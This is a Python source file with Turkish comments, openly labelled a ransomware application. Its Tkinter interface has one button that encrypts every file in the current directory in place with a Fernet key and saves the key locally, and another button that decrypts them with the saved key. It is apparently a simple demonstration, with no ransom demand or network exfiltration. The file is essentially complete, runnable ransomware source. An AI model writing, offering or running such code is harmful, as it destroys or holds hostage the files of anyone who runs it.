from tkinter import *
import os
from cryptography.fernet import Fernet

files = []
files1 = []

# Fonksiyon 1: Dosyaları şifreleme işlemi
def fonksiyon1():

    # Mevcut dizindeki dosyaları tarar ve şifreleme işlemi için dosya listesine ekler
    for file in os.listdir():
        if file == "malware.py" or file == "generatedkey.key":
            continue  # Çalıştığımız dosya veya anahtar dosyasını şifrelemeyi atlar
        if os.path.isfile(file):
            files.append(file)  # Sadece dosya ekler, dizinleri eklemez

    print(files)

    # Şifreleme anahtarını oluşturur
    key = Fernet.generate_key()

    print(key)

    # Oluşturulan anahtarı "generatedkey.key" dosyasına yazar
    with open("generatedkey.key", "wb") as generatedkey:
        generatedkey.write(key)

    # Dosyaların içeriğini şifreler
    for file in files:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted)

# Fonksiyon 2: Dosyaları geri çözme işlemi
def fonksiyon2():

    # Mevcut dizindeki dosyaları tarar ve çözme işlemi için dosya listesine ekler
    for file in os.listdir():
        if file == "malware.py" or file == "generatedkey.key":
            continue  # Çalıştığımız dosya veya anahtar dosyasını çözmeyi atlar
        if os.path.isfile(file):
            files1.append(file)  # Sadece dosya ekler, dizinleri eklemez

    print(files1)

    # Şifre çözme anahtarını "generatedkey.key" dosyasından okur
    with open("generatedkey.key", "rb") as generatedkey:
        secret_key = generatedkey.read()

    # Dosyaların içeriğini geri çözer
    for file in files1:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_decrypted)

# Tkinter arayüzünü oluşturur
pencere1 = Tk()
pencere1.geometry("500x200")
pencere1.title("Ransomware Uygulaması")

# Şifreleme butonu
buton1 = Button(pencere1, text="Ransomware uygulamasını başlatmak için tıklayınız", command=fonksiyon1, font="italic 12")
buton1.pack()

# Şifre çözme butonu
buton2 = Button(pencere1, text="Ransomware uygulamasını bitirmek için tıklayınız", command=fonksiyon2, font="italic 12")
buton2.pack()

# Tkinter döngüsünü başlatır
pencere1.mainloop()
